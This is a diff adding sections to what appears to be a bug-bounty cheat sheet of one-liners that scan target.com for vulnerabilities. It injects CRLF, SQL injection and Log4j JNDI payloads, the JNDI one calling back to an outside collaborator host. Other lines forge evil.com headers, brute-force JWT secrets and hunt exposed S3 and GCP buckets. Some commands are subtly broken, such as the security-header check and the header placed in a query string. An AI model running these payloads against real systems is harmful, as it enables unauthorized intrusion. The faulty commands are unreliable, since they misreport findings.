@@ -869,5 +869,73 @@ subfinder -d target.com | httpx -silent -path /.env -mc 200 -o exposed_env.txt
 cat all_urls.txt | gf ssrf | qsreplace 'http://your-collab-url.burpcollaborator.net' | httpx -silent
 ```
 
+### CRLF Injection
+```bash
+cat all_urls.txt | gf crlf | qsreplace '%0D%0ASet-Cookie:crlf=found' | httpx -silent -fr 'crlf=found' -o crlf_injections.txt
+```
 
+### CMS Detection (for Known Exploits)
+```bash
+subfinder -d target.com | httpx -silent -tech-detect -o cms_detected.txt
+```
+
+### Missing Security Headers (Easy Win)
+```bash
+cat all_urls.txt | httpx -silent -H 'X-Content-Type-Options' -H 'X-Frame-Options' -H 'Content-Security-Policy' -H 'Strict-Transport-Security' | grep -E "missing|absent" | tee weak_headers.txt
+```
+
+### Cache Poisoning Detection
+```bash
+cat all_urls.txt | gf cache | qsreplace 'X-Forwarded-Host: evil.com' | httpx -silent -fr 'evil.com' -o cache_poisoning.txt
+```
+
+### Client-Side Prototype Pollution
+```bash
+cat all_js_urls.txt | xargs -I{} curl -s {} | grep -E 'prototype|__proto__|constructor' | tee client_side_prototype.txt
+```
+
+### Sensitive Image Exposures (Backups/Logs)
+```bash
+subfinder -d target.com | httpx -silent -path-list <(echo -e '/backup.jpg\n/screenshot.png\n/db-dump.png\n/log.png') -mc 200 -o exposed_images.txt
+```
+
+### BONUS — Full Recon Workflow One-Liner
+```bash
+subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t vulnerabilities/ -o all_findings.txt
+```
+
+### Log4j Vulnerability Scanner (JNDI Injection)
+```bash
+cat all_urls.txt | qsreplace '${jndi:ldap://your-collab-url.burpcollaborator.net/a}' | httpx -silent -o log4j_candidates.txt
+```
+
+### AWS S3 Bucket Takeover (Misconfigured Buckets)
+```bash
+subfinder -d target.com | sed 's/$/.s3.amazonaws.com/' | httpx -silent -mc 200 -o open_buckets.txt
+```
+
+### JWT Secrets Brute Force (Weak Signing Key)
+```bash
+cat jwt_tokens.txt | jwt-cracker -w wordlist.txt -t 50 -o weak_jwt_keys.txt
+```
+
+### CORS Misconfiguration Finder
+```bash
+cat all_urls.txt | httpx -silent -H 'Origin: https://evil.com' -hdrs | grep -E "Access-Control-Allow-Origin: \*|Access-Control-Allow-Origin: https://evil.com" | tee cors_vulns.txt
+```
+
+### GCP Bucket Enumeration (Google Cloud)
+```bash
+subfinder -d target.com | sed 's/$/.storage.googleapis.com/' | httpx -silent -mc 200 -o open_gcp_buckets.txt
+```
+
+### Python Pickle Injection Check (Deserialization Bug)
+```bash
+cat all_urls.txt | gf deserialize | qsreplace 'evil_pickle_payload_here' | httpx -silent -o pickle_vulns.txt
+```
+
+### SQL Injection (Error-Based Detection)
+```bash
+cat all_urls.txt | gf sqli | qsreplace "' OR 1=1 --" | httpx -silent -fr 'syntax|sql|error|database' -o sql_injection.txt
+```
 
